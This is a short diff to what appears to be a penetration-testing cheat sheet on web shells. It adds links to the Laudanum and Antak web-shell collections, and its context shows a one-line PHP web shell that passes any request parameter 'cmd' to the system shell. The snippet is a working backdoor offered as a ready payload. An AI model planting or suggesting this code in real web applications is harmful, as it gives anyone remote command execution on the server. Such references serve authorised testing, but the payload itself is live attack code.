@@ -1,5 +1,8 @@
 # Web shells
 
+- [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
+- [Antak webshell](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)
+
 ## PHP
 ```php
 <?php system($_REQUEST["cmd"]);?>
